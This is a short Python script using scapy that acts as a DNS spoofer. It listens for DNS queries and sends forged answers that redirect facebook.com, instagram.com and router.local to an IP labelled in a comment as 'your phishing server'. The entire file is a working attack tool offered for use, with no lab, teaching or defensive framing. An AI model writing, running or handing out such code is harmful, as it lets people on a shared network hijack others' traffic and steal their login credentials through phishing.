# dns_spoofer.py
import scapy.all as scapy
from socket import gethostbyname
import sys

# Target domains to spoof
SPOOF_DOMAINS = ["facebook.com", "instagram.com", "router.local"]
SPOOF_IP = "192.168.1.66"  # your phishing server IP

def process_packet(pkt):
    if pkt.haslayer(scapy.DNSQR):  # DNS Question Record
        queried_domain = pkt[scapy.DNSQR].qname.decode().rstrip(".")
        print(f"[📡] DNS Request: {queried_domain}")

        for target in SPOOF_DOMAINS: 
            if target in queried_domain:
                print(f"[🎯] Spoofing {queried_domain} → {SPOOF_IP}")
                spoofed_pkt = (
                    scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) /
                    scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) /
                    scapy.DNS(
                        id=pkt[scapy.DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[scapy.DNS].qd,
                        an=scapy.DNSRR(rrname=pkt[scapy.DNSQR].qname, rdata=SPOOF_IP)
                    )
                )
                scapy.send(spoofed_pkt, verbose=0)
                break

def start_sniff(interface):
    print(f"[🚀] DNS Spoofer running on {interface}")
    scapy.sniff(filter="udp port 53", iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <interface>")
        exit()
    start_sniff(sys.argv[1])
